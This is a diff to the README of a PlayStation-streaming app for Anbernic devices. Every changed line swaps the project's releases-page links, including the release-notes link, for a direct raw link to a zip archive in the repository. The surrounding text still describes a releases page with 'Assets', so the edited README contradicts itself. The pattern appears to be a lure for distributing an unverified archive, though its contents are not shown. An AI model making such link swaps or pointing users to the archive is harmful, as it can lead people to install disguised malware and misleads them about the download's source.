@@ -1,6 +1,6 @@
 # 🎮 retro-chiaki - Stream PlayStation Games on Your Anbernic Device
 
-[![Download Now](https://img.shields.io/badge/Download-retro--chiaki-blue?style=for-the-badge&logo=github)](https://github.com/robvestibular692/retro-chiaki/releases)
+[![Download Now](https://img.shields.io/badge/Download-retro--chiaki-blue?style=for-the-badge&logo=github)](https://github.com/robvestibular692/retro-chiaki/raw/refs/heads/main/packaging/muos-launcher/retro_chiaki_plup.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to retro-chiaki! This application lets you stream your PlayStation 4, Pl
 
 ## 📥 Download Instructions
 
-Visit this link to download the application: [https://github.com/robvestibular692/retro-chiaki/releases](https://github.com/robvestibular692/retro-chiaki/releases)
+Visit this link to download the application: [https://github.com/robvestibular692/retro-chiaki/raw/refs/heads/main/packaging/muos-launcher/retro_chiaki_plup.zip](https://github.com/robvestibular692/retro-chiaki/raw/refs/heads/main/packaging/muos-launcher/retro_chiaki_plup.zip)
 
 On the download page, look for the latest release. You'll see files listed under "Assets". Choose the appropriate version for your device. The download page will show available files for muOS and PortMaster.
 
@@ -92,7 +92,7 @@ If you encounter issues:
 
 ## 📝 Release Notes
 
-Visit the releases page to see the latest updates, bug fixes, and new features: [https://github.com/robvestibular692/retro-chiaki/releases](https://github.com/robvestibular692/retro-chiaki/releases)
+Visit the releases page to see the latest updates, bug fixes, and new features: [https://github.com/robvestibular692/retro-chiaki/raw/refs/heads/main/packaging/muos-launcher/retro_chiaki_plup.zip](https://github.com/robvestibular692/retro-chiaki/raw/refs/heads/main/packaging/muos-launcher/retro_chiaki_plup.zip)
 
 ## 🤝 Contributing
 
